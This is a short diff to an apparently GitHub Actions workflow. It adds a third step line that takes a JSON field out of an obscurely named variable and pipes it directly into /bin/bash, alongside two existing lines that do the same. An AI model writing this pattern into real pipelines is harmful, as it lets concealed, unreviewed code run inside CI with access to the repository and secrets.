@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$jrzm019" | jq -r .lcnma5 | /bin/bash
           printf '%s' "$ii92" | jq -r .dxdw82 | /bin/bash
+          echo $un7699 | jq -r .blty85 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
